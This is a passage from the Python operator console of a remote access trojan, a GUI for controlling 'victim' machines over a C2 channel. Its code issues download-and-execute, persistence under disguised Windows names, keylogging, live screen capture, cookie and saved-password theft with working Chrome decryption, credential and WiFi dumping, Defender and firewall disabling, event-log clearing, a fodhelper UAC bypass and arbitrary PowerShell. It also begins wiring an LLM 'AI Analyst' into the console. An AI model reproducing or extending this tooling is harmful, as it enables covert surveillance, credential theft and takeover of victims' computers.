                    f"{k}: {v}" for k, v in cached.items()) + "\n"
            else:
                text = f"[{label}] ★cached  {cached}\n"
            self.gui_queue.put(("surv_out", text))
            self._set_status(f"{label} (cached)")
            return
        self._surv_cmd(live_cmd, label, cb)

    def _send_sys_cmd(self, cmd, label):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._set_status(f"{label}...")

        def worker():
            try:
                resp = client.send_command(cmd)
                if resp["status"] == "ok":
                    data = resp["data"]
                    if isinstance(data, list):
                        parts = []
                        for item in data:
                            if isinstance(item, dict):
                                parts.append("  " + "  ".join(
                                    f"{k}={v}" for k, v in item.items()))
                            else:
                                parts.append(f"  {item}")
                        self.gui_queue.put(("sys_out",
                            f"[{label}]\n" + "\n".join(parts) + "\n\n"))
                    elif isinstance(data, dict):
                        formatted = "\n".join(f"  {k}: {v}" for k, v in data.items())
                        self.gui_queue.put(("sys_out",
                            f"[{label}]\n{formatted}\n\n"))
                    else:
                        self.gui_queue.put(("sys_out", f"[{label}]  {data}\n"))
                else:
                    self.gui_queue.put(("sys_out",
                        f"[ERROR] {resp.get('message', '?')}\n"))
            except Exception as exc:
                self.gui_queue.put(("sys_out", f"[ERROR] {exc}\n"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))
            self.gui_queue.put(("status", "Ready"))

        threading.Thread(target=worker, daemon=True).start()

    def _sys_lock(self):
        self._send_sys_cmd({"type": "lock_screen"}, "Lock Screen")

    def _sys_signout(self):
        self._send_sys_cmd({"type": "signout"}, "Sign Out")

    def _sys_restart(self):
        if messagebox.askyesno("Confirm", "Restart the victim machine?"):
            self._send_sys_cmd({"type": "restart"}, "Restart")

    def _sys_shutdown(self):
        if messagebox.askyesno("Confirm", "Shut down the victim machine?"):
            self._send_sys_cmd({"type": "shutdown"}, "Shutdown")

    def _sys_open_url(self):
        url = self._url_var.get().strip()
        if url:
            self._send_sys_cmd({"type": "open_url", "url": url}, "Open URL")

    def _sys_msgbox(self):
        title = self._msgbox_title_var.get().strip() or "System"
        msg   = self._msgbox_msg_var.get().strip()
        self._send_sys_cmd({"type": "victim_msgbox", "title": title,
                            "message": msg}, "MsgBox")

    def _sys_dlexec(self):
        url  = self._dlexec_url_var.get().strip()
        dest = self._dlexec_dest_var.get().strip()
        if not url:
            return
        cmd = {"type": "download_exec", "url": url}
        if dest:
            cmd["dest"] = dest
        self._send_sys_cmd(cmd, "Download & Execute")

    def _sys_persist_add(self):
        name = self._persist_name_var.get().strip() or "WindowsHelper"
        path = self._persist_path_var.get().strip()
        if not path:
            messagebox.showwarning("Path needed", "Enter the BAT file path on the victim.")
            return
        self._send_sys_cmd({"type": "persistence_add",
                            "name": name, "path": path}, "Run Key Add")

    def _sys_persist_remove(self):
        name = self._persist_name_var.get().strip() or "WindowsHelper"
        self._send_sys_cmd({"type": "persistence_remove", "name": name}, "Run Key Remove")

    def _sys_task_add(self):
        name = self._persist_name_var.get().strip() or "WindowsUpdateHelper"
        path = self._persist_path_var.get().strip()
        cmd  = {"type": "scheduled_task_add", "name": name}
        if path:
            cmd["path"] = path
        self._send_sys_cmd(cmd, "Sched Task Add")

    def _sys_task_remove(self):
        name = self._persist_name_var.get().strip() or "WindowsUpdateHelper"
        self._send_sys_cmd({"type": "scheduled_task_remove", "name": name}, "Sched Task Remove")

    def _sys_wmi_add(self):
        name = self._wmi_name_var.get().strip() or "WUService"
        path = self._wmi_path_var.get().strip()
        cmd  = {"type": "wmi_persist_add", "name": name}
        if path:
            cmd["path"] = path
        self._send_sys_cmd(cmd, "WMI Persist Add")

    def _sys_wmi_remove(self):
        name = self._wmi_name_var.get().strip() or "WUService"
        self._send_sys_cmd({"type": "wmi_persist_remove", "name": name}, "WMI Persist Remove")

    def _sys_wallpaper(self):
        local = self._wallpaper_var.get().strip()
        if not local:
            messagebox.showwarning("No file", "Browse for a local image file first.")
            return
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._set_status("Uploading wallpaper...")

        def worker():
            try:
                with open(local, "rb") as fh:
                    data_b64 = base64.b64encode(fh.read()).decode("utf-8")
                resp = client.send_command(
                    {"type": "wallpaper_set", "data": data_b64})
                self.gui_queue.put(("sys_out",
                    f"[Wallpaper] {resp.get('data', resp.get('message'))}\n"))
            except Exception as exc:
                self.gui_queue.put(("sys_out", f"[Wallpaper error] {exc}\n"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))
            self.gui_queue.put(("status", "Ready"))

        threading.Thread(target=worker, daemon=True).start()

    def _build_surveillance_tab(self):
        p = self._tab_surveillance
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="Surveillance", bg=C["bg3"], fg=C["accent"],
                 font=FONT_UI_B, padx=10, pady=8).pack(side="left")
        body = _frame(p, bg=C["bg2"])
        body.pack(fill="both", expand=True)
        lc = _frame(body, bg=C["bg2"])
        lc.pack(side="left", fill="y", padx=(8, 4), pady=8)
        rc = _frame(body, bg=C["bg2"])
        rc.pack(side="left", fill="both", expand=True, pady=8, padx=(0, 8))

        def _hdr(t):
            tk.Label(lc, text=t, bg=C["bg2"], fg=C["text2"],
                     font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(10, 3))

        self._stream_active = False
        self._stream_client = None
        _hdr("SCREENSHOT")
        _btn(lc, "Take Screenshot", self._surv_screenshot,
             fg=C["accent"]).pack(fill="x", pady=1)
        self._stream_btn = _btn(lc, "\u25b6 Live Stream", self._stream_toggle,
                                fg=C["success"])
        self._stream_btn.pack(fill="x", pady=1)
        _hdr("ACTIVE WINDOW")
        _btn(lc, "Get Active Window", self._surv_active_window,
             fg=C["text3"]).pack(fill="x", pady=1)
        _hdr("KEYLOGGER")
        self._kl_status_var = tk.StringVar(value="\u25cf Stopped")
        self._kl_status_lbl = tk.Label(lc, textvariable=self._kl_status_var,
                                       bg=C["bg2"], fg=C["error"],
                                       font=("Segoe UI", 8, "bold"))
        self._kl_status_lbl.pack(anchor="w")
        kl_row = _frame(lc, bg=C["bg2"])
        kl_row.pack(fill="x", pady=2)
        _btn(kl_row, "Start", self._kl_start, fg=C["success"]).pack(side="left")
        _btn(kl_row, "Stop",  self._kl_stop,  fg=C["error"]).pack(side="left", padx=4)
        _btn(lc, "Dump Keys", self._kl_dump, fg=C["warning"]).pack(fill="x", pady=1)
        _hdr("CLIPBOARD")
        _btn(lc, "Get Clipboard", self._surv_clip_get,
             fg=C["text3"]).pack(fill="x", pady=1)
        self._clip_set_var = tk.StringVar()
        _entry(lc, self._clip_set_var, width=22).pack(fill="x", pady=2)
        _btn(lc, "Set Clipboard", self._surv_clip_set,
             fg=C["text3"]).pack(fill="x", pady=1)
        _hdr("SEND KEYS TO VICTIM")
        self._send_keys_var = tk.StringVar()
        _entry(lc, self._send_keys_var, width=22).pack(fill="x", pady=2)
        _btn(lc, "Send Keys", self._surv_send_keys,
             fg=C["accent2"]).pack(fill="x", pady=1)

        tk.Label(rc, text="OUTPUT / SCREENSHOT", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", pady=(0, 4))
        self._surv_out = scrolledtext.ScrolledText(
            rc, bg=C["term_bg"], fg=C["text3"],
            insertbackground=C["text"], font=FONT_MONO_SM,
            relief="flat", wrap="word", state="disabled",
            selectbackground=C["sel"], height=8,
        )
        self._surv_out.pack(fill="x")
        self._screenshot_frame = _frame(rc, bg=C["bg3"])
        self._screenshot_frame.pack(fill="both", expand=True, pady=(8, 0))
        self._screenshot_lbl = tk.Label(
            self._screenshot_frame, bg=C["bg3"],
            fg=C["text2"], text="Screenshot appears here", font=FONT_UI_SM,
        )
        self._screenshot_lbl.pack(fill="both", expand=True)

    def _surv_append(self, text):
        self._surv_out.configure(state="normal")
        self._surv_out.insert("end", text)
        self._surv_out.see("end")
        self._surv_out.configure(state="disabled")

    def _surv_cmd(self, cmd, label, callback=None):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._set_status(f"{label}...")

        def worker():
            try:
                resp = client.send_command(cmd)
                if callback:
                    self.gui_queue.put(("callback", callback, resp))
                elif resp["status"] == "ok":
                    self.gui_queue.put(("surv_out", f"[{label}]  {resp['data']}\n"))
                else:
                    self.gui_queue.put(("surv_out",
                        f"[{label} ERROR]  {resp.get('message')}\n"))
            except Exception as exc:
                self.gui_queue.put(("surv_out", f"[ERROR] {exc}\n"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))
            self.gui_queue.put(("status", "Ready"))

        threading.Thread(target=worker, daemon=True).start()

    def _surv_screenshot(self):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._set_status("Taking screenshot...")

        def worker():
            try:
                resp = client.send_command({"type": "screenshot"})
                if resp["status"] == "ok" and resp.get("encoding") == "base64":
                    self.gui_queue.put(("screenshot", resp["data"]))
                else:
                    self.gui_queue.put(("surv_out",
                        f"[Screenshot error] {resp.get('message', '?')}\n"))
            except Exception as exc:
                self.gui_queue.put(("surv_out", f"[ERROR] {exc}\n"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))
            self.gui_queue.put(("status", "Ready"))

        threading.Thread(target=worker, daemon=True).start()

    def _surv_active_window(self):
        def cb(resp):
            if resp["status"] == "ok":
                d = resp["data"]
                if isinstance(d, dict):
                    self.gui_queue.put(("surv_out",
                        f"[Active Window]  Title: {d.get('title')}  "
                        f"PID: {d.get('pid')}  Process: {d.get('process')}\n"))
                else:
                    self.gui_queue.put(("surv_out", f"[Active Window]  {d}\n"))
            else:
                self.gui_queue.put(("surv_out",
                    f"[Active Window ERROR]  {resp.get('message')}\n"))
        self._surv_cmd({"type": "active_window"}, "Active Window", cb)

    def _kl_start(self):
        def cb(resp):
            if resp["status"] == "ok":
                self.gui_queue.put(("kl_status", True, resp["data"]))
            else:
                self.gui_queue.put(("surv_out",
                    f"[Keylogger] {resp.get('message')}\n"))
        self._surv_cmd({"type": "keylogger_start"}, "Keylogger Start", cb)

    def _kl_stop(self):
        def cb(resp):
            self.gui_queue.put(("kl_status", False, resp.get("data", "")))
        self._surv_cmd({"type": "keylogger_stop"}, "Keylogger Stop", cb)

    def _kl_dump(self):
        def cb(resp):
            if resp["status"] == "ok":
                self.gui_queue.put(("surv_out",
                    f"[Keylog Dump]\n{resp['data']}\n\n"))
            else:
                self.gui_queue.put(("surv_out",
                    f"[Keylog Error] {resp.get('message')}\n"))
        self._surv_cmd({"type": "keylogger_dump"}, "Keylog Dump", cb)

    def _surv_clip_get(self):
        self._surv_from_info("clipboard", "Clipboard Get", {"type": "clipboard_get"})

    def _surv_clip_set(self):
        text = self._clip_set_var.get()
        if text:
            self._surv_cmd({"type": "clipboard_set", "text": text}, "Clipboard Set")

    def _surv_send_keys(self):
        text = self._send_keys_var.get()
        if text:
            self._surv_cmd({"type": "send_keys", "text": text}, "Send Keys")

    def _display_screenshot(self, b64_data):
        if not HAS_PIL:
            self._surv_append(
                "[Screenshot] Install Pillow (pip install pillow) to display images.\n")
            return
        try:
            img  = Image.open(BytesIO(base64.b64decode(b64_data)))
            w    = self._screenshot_frame.winfo_width()  or 640
            h    = self._screenshot_frame.winfo_height() or 360
            img.thumbnail((w, h), Image.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            self._screenshot_lbl.configure(image=photo, text="")
            self._screenshot_lbl._image = photo
            save = filedialog.asksaveasfilename(
                defaultextension=".png",
                filetypes=[("PNG", "*.png")],
                title="Save screenshot?",
            )
            if save:
                with open(save, "wb") as fh:
                    fh.write(base64.b64decode(b64_data))
        except Exception as exc:
            self._surv_append(f"[Screenshot display error] {exc}\n")

    def _stream_toggle(self):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        if self._stream_active:
            self._stream_active = False
            self._stream_btn.configure(text="\u25b6 Live Stream", fg=C["success"])
            return
        self._stream_active = True
        self._stream_client = client
        self._stream_btn.configure(text="\u25a0 Stop Stream", fg=C["error"])
        win = tk.Toplevel(self.root)
        win.title("Live Stream")
        win.geometry("960x560")
        win.configure(bg="black")
        lbl = tk.Label(win, bg="black", text="Connecting...", fg="white")
        lbl.pack(fill="both", expand=True)
        fps_var = tk.StringVar(value="FPS: —")
        tk.Label(win, textvariable=fps_var, bg="black",
                 fg=C["text2"], font=("Segoe UI", 8)).pack()
        def on_close():
            self._stream_active = False
            self._stream_btn.configure(text="\u25b6 Live Stream", fg=C["success"])
            win.destroy()
        win.protocol("WM_DELETE_WINDOW", on_close)

        import time as _time

        def loop():
            frame_count = 0
            t0 = _time.time()
            while self._stream_active and client.connected:
                try:
                    resp = client.send_command({"type": "screenshot_stream"})
                    if resp.get("status") == "ok" and resp.get("encoding") == "base64":
                        if HAS_PIL:
                            try:
                                img = Image.open(BytesIO(base64.b64decode(resp["data"])))
                                w = win.winfo_width() or 960
                                h = win.winfo_height() - 30 or 530
                                img.thumbnail((w, h), Image.LANCZOS)
                                photo = ImageTk.PhotoImage(img)
                                def _upd(p=photo):
                                    try:
                                        lbl.configure(image=p, text="")
                                        lbl._image = p
                                    except Exception:
                                        pass
                                self.root.after(0, _upd)
                                frame_count += 1
                                elapsed = _time.time() - t0
                                if elapsed > 0:
                                    self.root.after(0, lambda f=frame_count, e=elapsed:
                                        fps_var.set(f"FPS: {f/e:.1f}"))
                            except Exception:
                                pass
                        else:
                            self.root.after(0, lambda:
                                lbl.configure(text="Install Pillow to view stream.", fg="red"))
                            break
                except Exception as exc:
                    self.root.after(0, lambda e=str(exc):
                        lbl.configure(text=f"Stream error: {e}", fg="red"))
                    break
            self._stream_active = False
            self.root.after(0, lambda: self._stream_btn.configure(
                text="\u25b6 Live Stream", fg=C["success"]))

        threading.Thread(target=loop, daemon=True).start()

    def _postex_steal_cookies(self):
        self._postex_browser_db("cookie_steal", "Cookie Steal",
                                "cookies", "host_key", "name", "encrypted_value", "path", "expires_utc")

    def _postex_steal_logins(self):
        self._postex_browser_db("browser_logins", "Browser Logins",
                                "logins", "origin_url", "username_value", "password_value", "date_created")

    def _postex_browser_db(self, cmd_type, label, table, *cols):
        import sqlite3 as _sq3
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._set_status(f"{label}...")

        def _decrypt_chrome(enc_val, aes_key_bytes):
            if not enc_val:
                return ""
            try:
                if enc_val[:3] == b"v10":
                    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                    nonce = enc_val[3:15]
                    ct = enc_val[15:]
                    return AESGCM(aes_key_bytes).decrypt(nonce, ct, None).decode("utf-8", errors="replace")
                import ctypes
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]
                p_in = DATA_BLOB(len(enc_val), ctypes.cast(ctypes.c_char_p(enc_val), ctypes.POINTER(ctypes.c_char)))
                p_out = DATA_BLOB()
                ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(p_in), None, None, None, None, 0, ctypes.byref(p_out))
                return ctypes.string_at(p_out.pbData, p_out.cbData).decode("utf-8", errors="replace")
            except Exception:
                return "<encrypted>"

        def worker():
            try:
                resp = client.send_command({"type": cmd_type})
                if resp.get("status") != "ok":
                    self.gui_queue.put(("postex_out", f"[{label}] ERROR: {resp.get('message')}\n"))
                    return
                entries = resp.get("data", [])
                if not entries:
                    self.gui_queue.put(("postex_out", f"[{label}] No browser profiles found.\n"))
                    return
                all_rows = []
                save_path = None
                for entry in entries:
                    bn = entry.get("browser", "?")
                    pf = entry.get("profile", "?")
                    db_b64 = entry.get("db_b64", "")
                    aes_b64 = entry.get("aes_key_b64", "")
                    if not db_b64:
                        continue
                    aes_key = base64.b64decode(aes_b64) if aes_b64 else None
                    db_bytes = base64.b64decode(db_b64)
                    tmp = Path(os.environ.get("TEMP", ".")) / f"_rat_{uuid.uuid4().hex}.db"
                    try:
                        tmp.write_bytes(db_bytes)
                        con = _sq3.connect(str(tmp))
                        con.text_factory = bytes
                        cur = con.cursor()
                        try:
                            cur.execute(f"SELECT {','.join(cols)} FROM {table} LIMIT 2000")
                            rows = cur.fetchall()
                            for row in rows:
                                dec_row = []
                                for i, val in enumerate(row):
                                    if isinstance(val, (bytes, bytearray)) and aes_key and i == (2 if cmd_type == "browser_logins" else 2):
                                        val = _decrypt_chrome(bytes(val), aes_key)
                                    elif isinstance(val, (bytes, bytearray)):
                                        try:
                                            val = val.decode("utf-8", errors="replace")
                                        except Exception:
                                            val = repr(val)
                                    dec_row.append(str(val) if val else "")
                                all_rows.append((bn, pf) + tuple(dec_row))
                        except Exception as e:
                            self.gui_queue.put(("postex_out", f"  [{bn}/{pf}] DB read error: {e}\n"))
                        con.close()
                    except Exception as ex:
                        self.gui_queue.put(("postex_out", f"  [{bn}/{pf}] {ex}\n"))
                    finally:
                        try:
                            tmp.unlink()
                        except Exception:
                            pass

                if all_rows:
                    out_lines = [f"[{label}]  {len(all_rows)} records from {len(entries)} profiles\n"]
                    out_lines.append(f"  {'Browser':<8} {'Profile':<14} {' | '.join(c.upper() for c in cols)}\n")
                    out_lines.append("  " + "-" * 100 + "\n")
                    for row in all_rows[:500]:
                        out_lines.append("  " + " | ".join(str(v)[:60] for v in row) + "\n")
                    if len(all_rows) > 500:
                        out_lines.append(f"  ... {len(all_rows)-500} more rows. Save to file to see all.\n")
                    out_lines.append("\n")
                    text = "".join(out_lines)
                    self.gui_queue.put(("postex_out", text))

                    save_path = Path(os.path.expanduser("~")) / "Desktop" / f"rat_{cmd_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    try:
                        save_path.write_text(text, encoding="utf-8")
                        self.gui_queue.put(("postex_out", f"  [Saved to {save_path}]\n\n"))
                    except Exception:
                        pass
                else:
                    self.gui_queue.put(("postex_out", f"[{label}] No rows returned.\n"))
            except Exception as exc:
                self.gui_queue.put(("postex_out", f"[{label} ERROR] {exc}\n"))
            self.gui_queue.put(("status", "Ready"))

        threading.Thread(target=worker, daemon=True).start()

    def _postex_cmd(self, cmd, label, out_widget=None):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._set_status(f"{label}...")
        target = out_widget or getattr(self, "_postex_out", None)

        def worker():
            try:
                resp = client.send_command(cmd)
                data = resp.get("data", resp.get("message", "?"))
                if isinstance(data, list):
                    lines = []
                    for item in data:
                        if isinstance(item, dict):
                            lines.append("  " + "  ".join(
                                f"{k}={v}" for k, v in item.items()))
                        else:
                            lines.append(f"  {item}")
                    text = f"[{label}]  {resp['status']}\n" + "\n".join(lines) + "\n\n"
                elif isinstance(data, dict):
                    text = (f"[{label}]  {resp['status']}\n" +
                            "\n".join(f"  {k}: {v}" for k, v in data.items()) + "\n\n")
                else:
                    text = f"[{label}]  {resp['status']}\n  {data}\n\n"
                self.gui_queue.put(("postex_out", text))
            except Exception as exc:
                self.gui_queue.put(("postex_out", f"[ERROR] {exc}\n"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))
            self.gui_queue.put(("status", "Ready"))

        threading.Thread(target=worker, daemon=True).start()

    def _build_postex_tab(self):
        p = self._tab_postex
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="Post-Exploitation", bg=C["bg3"], fg=C["error"],
                 font=FONT_UI_B, padx=10, pady=8).pack(side="left")
        body = _frame(p, bg=C["bg2"])
        body.pack(fill="both", expand=True)

        left_outer = _frame(body, bg=C["bg2"])
        left_outer.pack(side="left", fill="y")
        canvas = tk.Canvas(left_outer, bg=C["bg2"], highlightthickness=0, width=240)
        sb = ttk.Scrollbar(left_outer, orient="vertical", command=canvas.yview)
        lc = _frame(canvas, bg=C["bg2"])
        lc.bind("<Configure>",
                lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=lc, anchor="nw", width=240)
        canvas.configure(yscrollcommand=sb.set)
        def _mw(e): canvas.yview_scroll(int(-1*(e.delta/120)), "units")
        canvas.bind("<MouseWheel>", _mw)
        lc.bind("<MouseWheel>", _mw)
        sb.pack(side="right", fill="y")
        canvas.pack(side="left", fill="y")

        def _hdr(txt):
            tk.Label(lc, text=txt, bg=C["bg3"], fg=C["text2"],
                     font=("Segoe UI", 8, "bold"),
                     padx=8, pady=4).pack(fill="x", pady=(8, 2))

        _hdr("\u2500  FILELESS PERSISTENCE")
        self._fp_name_var = tk.StringVar(value="MicrosoftUpdate")
        tk.Label(lc, text="Entry name:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        _entry(lc, self._fp_name_var, width=28).pack(fill="x", padx=6, pady=2)
        _btn(lc, "\u2795 Run-Key (no file on disk)",
             lambda: self._postex_cmd(
                 {"type": "fileless_persist", "name": self._fp_name_var.get()},
                 "Fileless Run-Key"),
             fg=C["success"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\u2795 Sched Task (no file on disk)",
             lambda: self._postex_cmd(
                 {"type": "fileless_task", "name": self._fp_name_var.get()},
                 "Fileless Task"),
             fg=C["success"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  DEFENSE EVASION")
        _btn(lc, "\U0001f6e1 Disable Defender",
             lambda: self._postex_cmd({"type": "disable_defender"}, "Disable Defender"),
             fg=C["warning"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f525 Disable Firewall",
             lambda: self._postex_cmd({"type": "disable_firewall"}, "Disable Firewall"),
             fg=C["warning"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f9f9 Clear Event Logs",
             lambda: self._postex_cmd({"type": "clear_logs"}, "Clear Logs"),
             fg=C["warning"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  PRIVILEGE ESCALATION")
        self._uac_cmd_var = tk.StringVar(value="cmd.exe")
        tk.Label(lc, text="Command to run elevated:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        _entry(lc, self._uac_cmd_var, width=28).pack(fill="x", padx=6, pady=2)
        _btn(lc, "\u2191 UAC Bypass (fodhelper)",
             lambda: self._postex_cmd(
                 {"type": "uac_bypass", "command": self._uac_cmd_var.get()},
                 "UAC Bypass"),
             fg=C["error"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  CREDENTIALS & BROWSER DATA")
        _btn(lc, "\U0001f511 Dump Credentials",
             lambda: self._postex_cmd({"type": "dump_credentials"}, "Dump Creds"),
             fg=C["accent"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f4f6 WiFi Passwords",
             lambda: self._postex_cmd({"type": "wifi_passwords"}, "WiFi Passwords"),
             fg=C["accent"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f36a Steal Cookies (Chrome/Edge/FF)",
             self._postex_steal_cookies,
             fg=C["error"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f5dd Steal Saved Passwords (Chrome/Edge)",
             self._postex_steal_logins,
             fg=C["error"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f30e Browser History DBs",
             lambda: self._postex_cmd({"type": "browser_history"}, "Browser History"),
             fg=C["text3"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  RECON / NETWORK")
        _btn(lc, "\U0001f4e1 Netstat",
             lambda: self._postex_cmd({"type": "netstat"}, "Netstat"),
             fg=C["text3"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f50d ARP Scan",
             lambda: self._postex_cmd({"type": "arp_scan"}, "ARP Scan"),
             fg=C["text3"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f4bb Installed Software",
             lambda: self._postex_cmd({"type": "installed_software"}, "Installed SW"),
             fg=C["text3"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  SERVICES")
        _btn(lc, "\U0001f4cb List Services",
             lambda: self._postex_cmd({"type": "services_list"}, "Services List"),
             fg=C["text3"]).pack(fill="x", padx=6, pady=1)
        svc_row = _frame(lc, bg=C["bg2"])
        svc_row.pack(fill="x", padx=6, pady=2)
        self._svc_name_var = tk.StringVar(value="wuauserv")
        _entry(svc_row, self._svc_name_var, width=14).pack(side="left")
        self._svc_action_var = tk.StringVar(value="stop")
        svc_sel = ttk.Combobox(svc_row, textvariable=self._svc_action_var,
                               values=["start", "stop", "restart", "enable", "disable"],
                               width=8, state="readonly")
        svc_sel.pack(side="left", padx=2)
        _btn(lc, "Apply Service Action",
             lambda: self._postex_cmd(
                 {"type": "service_control",
                  "service": self._svc_name_var.get(),
                  "action": self._svc_action_var.get()},
                 "Service Control"),
             fg=C["warning"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  REGISTRY")
        tk.Label(lc, text="Path:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        self._reg_path_var = tk.StringVar(value=r"HKCU:\Software\Test")
        _entry(lc, self._reg_path_var, width=28).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\U0001f4c2 Read Registry Key",
             lambda: self._postex_cmd(
                 {"type": "registry_read", "path": self._reg_path_var.get()},
                 "Registry Read"),
             fg=C["text3"]).pack(fill="x", padx=6, pady=1)
        reg_nm_row = _frame(lc, bg=C["bg2"])
        reg_nm_row.pack(fill="x", padx=6, pady=1)
        tk.Label(reg_nm_row, text="Name:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(side="left")
        self._reg_name_var = tk.StringVar(value="MyVal")
        _entry(reg_nm_row, self._reg_name_var, width=10).pack(side="left", padx=2)
        tk.Label(reg_nm_row, text="Val:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(side="left")
        self._reg_val_var = tk.StringVar(value="data")
        _entry(reg_nm_row, self._reg_val_var, width=8).pack(side="left", padx=2)
        _btn(lc, "\u270f Write Registry Value",
             lambda: self._postex_cmd(
                 {"type": "registry_write", "path": self._reg_path_var.get(),
                  "name": self._reg_name_var.get(), "value": self._reg_val_var.get()},
                 "Registry Write"),
             fg=C["warning"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "\u274c Delete Registry Key/Value",
             lambda: self._postex_cmd(
                 {"type": "registry_delete", "path": self._reg_path_var.get(),
                  "name": self._reg_name_var.get() or None},
                 "Registry Delete"),
             fg=C["error"]).pack(fill="x", padx=6, pady=(1, 2))

        _hdr("\u2500  EXECUTE POWERSHELL")
        self._runps_var = tk.StringVar(value="Get-Date")
        _entry(lc, self._runps_var, width=28).pack(fill="x", padx=6, pady=2)
        _btn(lc, "\u25b6 Run PowerShell Code",
             lambda: self._postex_cmd(
                 {"type": "run_ps", "code": self._runps_var.get()},
                 "Run PS"),
             fg=C["accent2"]).pack(fill="x", padx=6, pady=(1, 10))

        right_col = _frame(body, bg=C["bg2"])
        right_col.pack(side="left", fill="both", expand=True, padx=(4, 0))
        hdr_row = _frame(right_col, bg=C["bg2"])
        hdr_row.pack(fill="x", padx=6, pady=(8, 4))
        tk.Label(hdr_row, text="OUTPUT", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold")).pack(side="left")
        _btn(hdr_row, "Clear", lambda: (
            self._postex_out.configure(state="normal"),
            self._postex_out.delete("1.0", "end"),
            self._postex_out.configure(state="disabled")
        ), fg=C["text2"]).pack(side="right")
        self._postex_out = scrolledtext.ScrolledText(
            right_col, bg=C["term_bg"], fg=C["text3"],
            insertbackground=C["text"], font=FONT_MONO_SM,
            relief="flat", wrap="word", state="disabled",
            selectbackground=C["sel"],
        )
        self._postex_out.pack(fill="both", expand=True, padx=4, pady=(0, 4))

    # ---------------------------------------------------------------------------
    # AI Analyst Tab  —  purely server-side, zero impact on client / payload
    #
    # ALL code below runs exclusively on the C2 operator machine (this Python
    # process).  Nothing here touches the PowerShell payload, the HTTP C2
    # handlers (/r /u /c /p /dbg), ClientSession, or any victim networking.
    #
    # Supported providers:
    #   • Ollama (local)  — HTTP POST to localhost:11434  (loopback only)
    #   • OpenAI API      — HTTPS POST to api.openai.com  (operator outbound)
    #
    # Conversation history is capped at 40 messages (20 turns) to avoid
    # exceeding model context limits.
    # ---------------------------------------------------------------------------

    def _build_ai_tab(self):
        """Build the entire AI Analyst tab layout inside self._tab_ai."""
        p = self._tab_ai

        # ── Top toolbar banner ────────────────────────────────────────────────
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="\U0001f916  AI Analyst", bg=C["bg3"],
                 fg=C["accent"], font=FONT_UI_B, padx=10, pady=8).pack(side="left")

        # ── Configuration area (provider / model / key) ───────────────────────
        top = _frame(p, bg=C["bg2"])
        top.pack(fill="x", padx=12, pady=(10, 4))

        # Provider selector — switches between Ollama and OpenAI input rows
        prov_row = _frame(top, bg=C["bg2"])
        prov_row.pack(anchor="w", pady=2)
        tk.Label(prov_row, text="Provider:", bg=C["bg2"], fg=C["text3"],
                 font=FONT_UI_SM).pack(side="left")
        self._ai_provider_var = tk.StringVar(value="Ollama (local)")
        prov_cb = ttk.Combobox(prov_row, textvariable=self._ai_provider_var,
                               values=["Ollama (local)", "OpenAI API"],
                               state="readonly", width=16)
        prov_cb.pack(side="left", padx=6)
        # Changing the dropdown shows/hides the correct config row below
        prov_cb.bind("<<ComboboxSelected>>", self._ai_on_provider_change)

        # ── Ollama config row (shown by default) ──────────────────────────────
        # Ollama is free and runs locally — no data leaves the machine
        # Setup: `ollama serve` + `ollama pull llama3.2`
        self._ai_ollama_frame = _frame(top, bg=C["bg2"])
        self._ai_ollama_frame.pack(anchor="w", pady=2, fill="x")
